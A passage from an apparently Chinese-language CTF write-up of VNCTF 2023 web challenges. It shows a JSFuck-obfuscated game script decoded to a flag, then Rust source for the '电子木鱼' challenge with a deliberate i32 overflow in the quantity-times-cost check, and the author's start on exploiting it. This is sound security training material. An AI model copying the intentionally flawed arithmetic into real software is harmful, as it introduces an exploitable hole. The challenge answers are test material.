+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+[![]]+[])[+[]]+(!![]+[])[+[]]+[+!+[]]+[+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]])[(![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]]((!![]+[])[+[]])[([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]](([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])+[])[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])())<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;很遗憾，你输了！&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这些符号是被编码过的，直接复制到控制台解码得到flag<code>flag&#123;w3lc0m3_t0_VNCTF_2023~~~&#125;</code></p><h3 id="电子木鱼"><a class="markdownIt-Anchor" href="#电子木鱼"></a> 电子木鱼</h3><p>先下源码，是一个rust 语言编写的</p><p>看到 <code>main.rs</code></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">use</span> actix_files::Files;<br><span class="hljs-keyword">use</span> actix_web::&#123;<br>    error, get, post,<br>    web::&#123;<span class="hljs-keyword">self</span>, Json&#125;,<br>    App, Error, HttpResponse, HttpServer,<br>&#125;;<br><span class="hljs-keyword">use</span> once_cell::sync::Lazy;<br><span class="hljs-keyword">use</span> serde::&#123;Deserialize, Serialize&#125;;<br><span class="hljs-keyword">use</span> std::sync::&#123;Arc, Mutex&#125;;<br><span class="hljs-keyword">use</span> tera::&#123;Context, Tera&#125;;<br><br><span class="hljs-keyword">static</span> GONGDE: Lazy&lt;ThreadLocker&lt;<span class="hljs-type">i32</span>&gt;&gt; = Lazy::<span class="hljs-title function_ invoke__">new</span>(|| ThreadLocker::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-number">0</span>));<br><br><span class="hljs-meta">#[derive(Debug, Clone, Default)]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ThreadLocker</span>&lt;T&gt; &#123;<br>    value: Arc&lt;Mutex&lt;T&gt;&gt;,<br>&#125;<br><br><span class="hljs-keyword">impl</span>&lt;T: <span class="hljs-built_in">Clone</span>&gt; ThreadLocker&lt;T&gt; &#123;<br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">get</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> T &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">mutex</span> = <span class="hljs-keyword">self</span>.value.<span class="hljs-title function_ invoke__">lock</span>().<span class="hljs-title function_ invoke__">unwrap</span>();<br>        mutex.<span class="hljs-title function_ invoke__">clone</span>()<br>    &#125;<br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">set</span>(&amp;<span class="hljs-keyword">self</span>, val: T) &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">mutex</span> = <span class="hljs-keyword">self</span>.value.<span class="hljs-title function_ invoke__">lock</span>().<span class="hljs-title function_ invoke__">unwrap</span>();<br>        *mutex = val;<br>    &#125;<br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">from</span>(val: T) <span class="hljs-punctuation">-&gt;</span> ThreadLocker&lt;T&gt; &#123;<br>        ThreadLocker::&lt;T&gt; &#123;<br>            value: Arc::<span class="hljs-title function_ invoke__">new</span>(Mutex::<span class="hljs-title function_ invoke__">new</span>(val)),<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">#[derive(Serialize)]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">APIResult</span> &#123;<br>    success: <span class="hljs-type">bool</span>,<br>    message: &amp;<span class="hljs-symbol">&#x27;static</span> <span class="hljs-type">str</span>,<br>&#125;<br><br><span class="hljs-meta">#[derive(Deserialize)]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Info</span> &#123;<br>    name: <span class="hljs-type">String</span>,<br>    quantity: <span class="hljs-type">i32</span>,<br>&#125;<br><br><span class="hljs-meta">#[derive(Debug, Copy, Clone, Serialize)]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Payload</span> &#123;<br>    name: &amp;<span class="hljs-symbol">&#x27;static</span> <span class="hljs-type">str</span>,<br>    cost: <span class="hljs-type">i32</span>,<br>&#125;<br><br><span class="hljs-keyword">const</span> PAYLOADS: &amp;[Payload] = &amp;[<br>    Payload &#123;<br>        name: <span class="hljs-string">&quot;Cost&quot;</span>,<br>        cost: <span class="hljs-number">10</span>,<br>    &#125;,<br>    Payload &#123;<br>        name: <span class="hljs-string">&quot;Loan&quot;</span>,<br>        cost: -<span class="hljs-number">1_000</span>,<br>    &#125;,<br>    Payload &#123;<br>        name: <span class="hljs-string">&quot;CCCCCost&quot;</span>,<br>        cost: <span class="hljs-number">500</span>,<br>    &#125;,<br>    Payload &#123;<br>        name: <span class="hljs-string">&quot;Donate&quot;</span>,<br>        cost: <span class="hljs-number">1</span>,<br>    &#125;,<br>    Payload &#123;<br>        name: <span class="hljs-string">&quot;Sleep&quot;</span>,<br>        cost: <span class="hljs-number">0</span>,<br>    &#125;,<br>];<br><br><span class="hljs-meta">#[get(<span class="hljs-string">&quot;/&quot;</span>)]</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">index</span>(tera: web::Data&lt;Tera&gt;) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;HttpResponse, Error&gt; &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">context</span> = Context::<span class="hljs-title function_ invoke__">new</span>();<br><br>    context.<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-string">&quot;gongde&quot;</span>, &amp;GONGDE.<span class="hljs-title function_ invoke__">get</span>());<br><br>    <span class="hljs-keyword">if</span> GONGDE.<span class="hljs-title function_ invoke__">get</span>() &gt; <span class="hljs-number">1_000_000_000</span> &#123;<br>        context.<span class="hljs-title function_ invoke__">insert</span>(<br>            <span class="hljs-string">&quot;flag&quot;</span>,<br>            &amp;std::env::<span class="hljs-title function_ invoke__">var</span>(<span class="hljs-string">&quot;FLAG&quot;</span>).<span class="hljs-title function_ invoke__">unwrap_or_else</span>(|_| <span class="hljs-string">&quot;flag&#123;test_flag&#125;&quot;</span>.<span class="hljs-title function_ invoke__">to_string</span>()),  <span class="hljs-comment">//这里出flag</span><br>        );<br>    &#125;<br><br>    <span class="hljs-keyword">match</span> tera.<span class="hljs-title function_ invoke__">render</span>(<span class="hljs-string">&quot;index.html&quot;</span>, &amp;context) &#123;<br>        <span class="hljs-title function_ invoke__">Ok</span>(body) =&gt; <span class="hljs-title function_ invoke__">Ok</span>(HttpResponse::<span class="hljs-title function_ invoke__">Ok</span>().<span class="hljs-title function_ invoke__">body</span>(body)),<br>        <span class="hljs-title function_ invoke__">Err</span>(err) =&gt; <span class="hljs-title function_ invoke__">Err</span>(error::<span class="hljs-title function_ invoke__">ErrorInternalServerError</span>(err)),<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">#[get(<span class="hljs-string">&quot;/reset&quot;</span>)]</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">reset</span>() <span class="hljs-punctuation">-&gt;</span> Json&lt;APIResult&gt; &#123;<br>    GONGDE.<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-number">0</span>);<br>    web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>        success: <span class="hljs-literal">true</span>,<br>        message: <span class="hljs-string">&quot;重开成功，继续挑战佛祖吧&quot;</span>,<br>    &#125;)<br>&#125;<br><br><span class="hljs-meta">#[post(<span class="hljs-string">&quot;/upgrade&quot;</span>)]</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">upgrade</span>(body: web::Form&lt;Info&gt;) <span class="hljs-punctuation">-&gt;</span> Json&lt;APIResult&gt; &#123;<br>    <span class="hljs-keyword">if</span> GONGDE.<span class="hljs-title function_ invoke__">get</span>() &lt; <span class="hljs-number">0</span> &#123;<br>        <span class="hljs-keyword">return</span> web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>            success: <span class="hljs-literal">false</span>,<br>            message: <span class="hljs-string">&quot;功德都搞成负数了，佛祖对你很失望&quot;</span>,<br>        &#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> body.quantity &lt;= <span class="hljs-number">0</span> &#123;<br>        <span class="hljs-keyword">return</span> web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>            success: <span class="hljs-literal">false</span>,<br>            message: <span class="hljs-string">&quot;佛祖面前都敢作弊，真不怕遭报应啊&quot;</span>,<br>        &#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-variable">Some</span>(payload) = PAYLOADS.<span class="hljs-title function_ invoke__">iter</span>().<span class="hljs-title function_ invoke__">find</span>(|u| u.name == body.name) &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">cost</span> = payload.cost;<br><br>        <span class="hljs-keyword">if</span> payload.name == <span class="hljs-string">&quot;Donate&quot;</span> || payload.name == <span class="hljs-string">&quot;Cost&quot;</span> &#123;<br>            cost *= body.quantity;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> GONGDE.<span class="hljs-title function_ invoke__">get</span>() &lt; cost <span class="hljs-keyword">as</span> <span class="hljs-type">i32</span> &#123;<br>            <span class="hljs-keyword">return</span> web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>                success: <span class="hljs-literal">false</span>,<br>                message: <span class="hljs-string">&quot;功德不足&quot;</span>,<br>            &#125;);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> cost != <span class="hljs-number">0</span> &#123;<br>            GONGDE.<span class="hljs-title function_ invoke__">set</span>(GONGDE.<span class="hljs-title function_ invoke__">get</span>() - cost <span class="hljs-keyword">as</span> <span class="hljs-type">i32</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> payload.name == <span class="hljs-string">&quot;Cost&quot;</span> &#123;<br>            <span class="hljs-keyword">return</span> web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>                success: <span class="hljs-literal">true</span>,<br>                message: <span class="hljs-string">&quot;小扣一手功德&quot;</span>,<br>            &#125;);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> payload.name == <span class="hljs-string">&quot;CCCCCost&quot;</span> &#123;<br>            <span class="hljs-keyword">return</span> web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>                success: <span class="hljs-literal">true</span>,<br>                message: <span class="hljs-string">&quot;功德都快扣没了，怎么睡得着的&quot;</span>,<br>            &#125;);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> payload.name == <span class="hljs-string">&quot;Loan&quot;</span> &#123;<br>            <span class="hljs-keyword">return</span> web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>                success: <span class="hljs-literal">true</span>,<br>                message: <span class="hljs-string">&quot;我向佛祖许愿，佛祖借我功德，快说谢谢佛祖&quot;</span>,<br>            &#125;);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> payload.name == <span class="hljs-string">&quot;Donate&quot;</span> &#123;<br>            <span class="hljs-keyword">return</span> web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>                success: <span class="hljs-literal">true</span>,<br>                message: <span class="hljs-string">&quot;好人有好报&quot;</span>,<br>            &#125;);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> payload.name == <span class="hljs-string">&quot;Sleep&quot;</span> &#123;<br>            <span class="hljs-keyword">return</span> web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>                success: <span class="hljs-literal">true</span>,<br>                message: <span class="hljs-string">&quot;这是什么？床，睡一下&quot;</span>,<br>            &#125;);<br>        &#125;<br>    &#125;<br><br>    web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>        success: <span class="hljs-literal">false</span>,<br>        message: <span class="hljs-string">&quot;禁止开摆&quot;</span>,<br>    &#125;)<br>&#125;<br><br><span class="hljs-meta">#[actix_web::main]</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() <span class="hljs-punctuation">-&gt;</span> std::io::<span class="hljs-type">Result</span>&lt;()&gt; &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">port</span> = std::env::<span class="hljs-title function_ invoke__">var</span>(<span class="hljs-string">&quot;PORT&quot;</span>)<br>        .<span class="hljs-title function_ invoke__">unwrap_or_else</span>(|_| <span class="hljs-string">&quot;2333&quot;</span>.<span class="hljs-title function_ invoke__">to_string</span>())<br>        .<span class="hljs-title function_ invoke__">parse</span>()<br>        .<span class="hljs-title function_ invoke__">expect</span>(<span class="hljs-string">&quot;Invalid PORT&quot;</span>);<br><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Listening on 0.0.0.0:&#123;&#125;&quot;</span>, port);<br><br>    HttpServer::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-keyword">move</span> || &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">tera</span> = <span class="hljs-keyword">match</span> Tera::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-string">&quot;src/templates/**/*.html&quot;</span>) &#123;<br>            <span class="hljs-title function_ invoke__">Ok</span>(t) =&gt; t,<br>            <span class="hljs-title function_ invoke__">Err</span>(e) =&gt; &#123;<br>                <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Error: &#123;&#125;&quot;</span>, e);<br>                ::std::process::<span class="hljs-title function_ invoke__">exit</span>(<span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;;<br>        App::<span class="hljs-title function_ invoke__">new</span>()<br>            .<span class="hljs-title function_ invoke__">app_data</span>(web::Data::<span class="hljs-title function_ invoke__">new</span>(tera))<br>            .<span class="hljs-title function_ invoke__">service</span>(Files::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-string">&quot;/asset&quot;</span>, <span class="hljs-string">&quot;src/templates/asset/&quot;</span>).<span class="hljs-title function_ invoke__">prefer_utf8</span>(<span class="hljs-literal">true</span>))<br>            .<span class="hljs-title function_ invoke__">service</span>(index)<br>            .<span class="hljs-title function_ invoke__">service</span>(upgrade)<br>            .<span class="hljs-title function_ invoke__">service</span>(reset)<br>    &#125;)<br>    .<span class="hljs-title function_ invoke__">bind</span>((<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port))?<br>    .<span class="hljs-title function_ invoke__">run</span>()<br>    .<span class="hljs-keyword">await</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>当<code>GONGDE&gt;1000000000</code>时，访问/就可以出flag，所以现在就是要加功德</p><p>这个就想起之前做的溢出</p><p>看到quantity用的是i32数据类型，查一下i32数据范围</p><img src="/2023/02/19/VNCTF2023/1.png" class=""><p>再看到<code>/upgrade</code>发现</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-variable">Some</span>(payload) = PAYLOADS.<span class="hljs-title function_ invoke__">iter</span>().<span class="hljs-title function_ invoke__">find</span>(|u| u.name == body.name) &#123;<br>       <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">cost</span> = payload.cost;<br><br>       <span class="hljs-keyword">if</span> payload.name == <span class="hljs-string">&quot;Donate&quot;</span> || payload.name == <span class="hljs-string">&quot;Cost&quot;</span> &#123;<br>           cost *= body.quantity;<br>       